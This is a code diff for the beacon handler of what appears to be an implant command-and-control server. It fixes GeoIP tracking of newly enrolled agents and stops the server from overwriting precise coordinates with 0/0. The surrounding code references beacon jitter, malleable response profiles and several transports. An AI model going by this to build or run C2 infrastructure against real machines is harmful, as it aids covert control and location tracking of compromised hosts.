@@ -444,21 +444,24 @@ func (s *Server) handleBeacon(c *gin.Context) {
 				defer cancel()
 				country, city, lat, lon := s.lookupGeoIP(ctx, publicIP)
 				if country != "" {
+					updates := geoAgentUpdates(country, city, lat, lon)
+					// env.UUID, not req.UUID: registration and handshake frames
+					// carry no request body, so req.UUID is empty there and the
+					// update silently matched zero rows — the lookup ran and the
+					// answer was thrown away on exactly the first check-in that
+					// introduces a new agent.
 					result := s.withBusyRetryDB("enroll", func() *gorm.DB {
 						return s.db.Model(&db.Implant{}).
-							Where("id = ? AND (country != ? OR city != ?)", req.UUID, country, city).
-							Updates(map[string]interface{}{
-								"country": country, "city": city,
-								"latitude": lat, "longitude": lon,
-							})
+							Where("id = ? AND (country != ? OR city != ?)", env.UUID, country, city).
+							Updates(updates)
 					})
 					if result.Error != nil {
-						slog.Error("Failed to update GeoIP data", "agent_id", req.UUID, "err", result.Error)
+						slog.Error("Failed to update GeoIP data", "agent_id", env.UUID, "err", result.Error)
 					}
 				}
 			}()
 		default:
-			slog.Warn("GeoIP lookup queue full, dropping lookup", "agent_id", req.UUID, "ip", publicIP)
+			slog.Warn("GeoIP lookup queue full, dropping lookup", "agent_id", env.UUID, "ip", publicIP)
 		}
 	}
 
@@ -467,6 +470,20 @@ func (s *Server) handleBeacon(c *gin.Context) {
 	// for every other transport (TCP/WS/DNS binary frames are not wrapped).
 	s.jitterBeaconResponse()
 	s.applyMalleableProfile(c, respBytes)
+}
+
+// geoAgentUpdates is the column set for an agent's resolved location. It only
+// includes coordinates when a provider supplied them: the fallback providers
+// answer country/city without lat/lon, and writing 0/0 would move the agent's
+// map marker to the Gulf of Guinea — or overwrite a precise position resolved
+// earlier by ip-api.com.
+func geoAgentUpdates(country, city string, lat, lon float64) map[string]interface{} {
+	updates := map[string]interface{}{"country": country, "city": city}
+	if lat != 0 || lon != 0 {
+		updates["latitude"] = lat
+		updates["longitude"] = lon
+	}
+	return updates
 }
 
 func decodeBeaconIdentity(info map[string]string) (hostname, username, ip string) {
